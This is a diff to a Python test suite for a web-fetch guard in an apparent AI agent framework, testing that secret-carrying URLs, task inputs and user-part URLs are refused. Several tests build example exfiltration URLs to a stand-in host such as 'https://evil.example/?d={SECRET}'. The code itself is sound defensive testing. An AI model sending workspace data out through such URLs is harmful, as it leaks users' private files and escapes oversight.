@@ -15,7 +15,16 @@ from desman.core.models import Subtask, SubtaskSpec, TaskSpec
 from desman.core.policy import Permission, executor_access
 from desman.core.store import Store
 from desman.core.tools import Toolbox, ToolCall, builtin_registry
-from desman.core.web import MAX_LINKS, Fetcher, SearchResult, Web, html_page, page_links
+from desman.core.web import (
+    ALL_LINKS,
+    MAX_CALLS,
+    MAX_LINKS,
+    Fetcher,
+    SearchResult,
+    Web,
+    html_page,
+    page_links,
+)
 from desman.core.webguard import normal, urls_in
 
 PUBLIC = "93.184.216.34"
@@ -152,8 +161,67 @@ def test_before_the_web_any_url_but_none_carrying_the_workspace(
 
     carried = fetch(toolbox, f"https://free.example/any?q={SECRET}")
     assert not carried.ok and "notes/private.txt" in (carried.error or "")
+    padded = fetch(toolbox, f"https://free.example/any?q=x{SECRET}!")  # not whole: still a run
+    assert not padded.ok
+    # Writing the URL out in a file of its own does not make it the person's list of links.
+    evil = f"https://evil.example/?d={SECRET}"
+    toolbox.workspace.write("x.txt", evil.encode())
+    assert not fetch(toolbox, evil).ok
     assert site.requests == []
-    assert fetch(toolbox, "https://free.example/any").ok  # written in a workspace file
+    assert fetch(toolbox, "https://free.example/any").ok  # carries nothing
+
+
+def test_before_the_web_inputs_count_as_the_tasks_data(
+    store: Store, tmp_path: Path, site: Site
+) -> None:
+    store.create_task(
+        TaskSpec(
+            goal="read",
+            subtasks=[
+                SubtaskSpec(description="read", acceptance_criteria="ok", inputs={"notes": SECRET})
+            ],
+        )
+    )
+    subtask = store.claim("w1")
+    assert subtask is not None
+    toolbox = box(store, subtask, tmp_path, site)
+    refused = fetch(toolbox, f"https://free.example/any?q={SECRET}")
+    assert not refused.ok and "task data" in (refused.error or "")
+
+
+def test_a_user_part_is_never_opened(store: Store, tmp_path: Path, site: Site) -> None:
+    subtask = claim(store)
+    toolbox = box(store, subtask, tmp_path, site)
+    assert fetch(toolbox, START).ok
+    for url in ("https://@evil.example/?d=x", "https://:@evil.example/", "https://u@evil.example/"):
+        result = fetch(toolbox, url)
+        assert not result.ok and "user part" in (result.error or ""), url
+    assert not any("evil.example" in url for url in site.requests)
+
+
+def test_refused_calls_are_not_counted(store: Store, tmp_path: Path, site: Site) -> None:
+    subtask = claim(store)
+    toolbox = box(store, subtask, tmp_path, site)
+    assert fetch(toolbox, START).ok
+    for n in range(MAX_CALLS + 5):
+        assert not fetch(toolbox, f"https://evil.example/{n}").ok
+    assert fetch(toolbox, "https://start.example/next").ok
+
+
+def test_every_link_of_a_page_saved_whole_is_seen(store: Store, tmp_path: Path, site: Site) -> None:
+    anchors = "".join(f'<a href="/p{i}">p{i}</a>' for i in range(MAX_LINKS + 50))
+    site.pages["https://big.example/"] = html(f"<p>Big</p>{anchors}")
+    site.pages[f"https://big.example/p{MAX_LINKS + 40}"] = html("<p>far</p>")
+    subtask = claim(store, goal="read https://big.example/")
+    toolbox = box(store, subtask, tmp_path, site)
+    page = fetch(toolbox, "https://big.example/")
+    assert len(page.output["links"]) == MAX_LINKS
+    saved = toolbox.workspace.read(page.output["saved"]).decode()
+    assert f"https://big.example/p{MAX_LINKS + 40}" in saved
+    assert fetch(toolbox, f"https://big.example/p{MAX_LINKS + 40}").ok
+    # A saved page written over is no longer the page web_fetch read.
+    toolbox.workspace.write(page.output["saved"], (saved + "https://evil.example/z\n").encode())
+    assert not fetch(toolbox, "https://evil.example/z").ok
 
 
 def test_seen_urls_outlive_a_crash(store: Store, tmp_path: Path, site: Site) -> None:
@@ -186,14 +254,29 @@ def test_links_are_absolute_http_without_fragments() -> None:
     _, _, hrefs = html_page(
         '<a href="/b">b</a><a href="#top">top</a><a href="mailto:x@y.z">m</a>'
         '<a href="b">again</a><a href="https://c.example/d#e">c</a><area href="/map">'
+        '<a href="/wiki/Python_(language)">py</a>'
     )
     assert page_links("https://a.example/", hrefs) == (
         "https://a.example/b",
         "https://c.example/d",
         "https://a.example/map",
+        "https://a.example/wiki/Python_(language)",  # an href is never trimmed
     )
-    many = [f"/p{i}" for i in range(MAX_LINKS + 10)]
-    assert len(page_links("https://a.example/", many)) == MAX_LINKS
+    many = [f"/p{i}" for i in range(ALL_LINKS + 10)]
+    assert len(page_links("https://a.example/", many)) == ALL_LINKS
+
+
+def test_a_link_that_starts_a_longer_url_in_the_text_is_shown(
+    store: Store, tmp_path: Path, site: Site
+) -> None:
+    site.pages["https://a.example/"] = html(
+        '<a href="https://a.example/doc">doc</a><p>see https://a.example/docs/v2</p>'
+    )
+    site.pages["https://a.example/doc"] = html("<p>doc</p>")
+    subtask = claim(store, goal="read https://a.example/")
+    toolbox = box(store, subtask, tmp_path, site)
+    assert fetch(toolbox, "https://a.example/").output["links"] == ["https://a.example/doc"]
+    assert fetch(toolbox, "https://a.example/doc").ok
 
 
 def test_urls_are_compared_in_one_form() -> None:
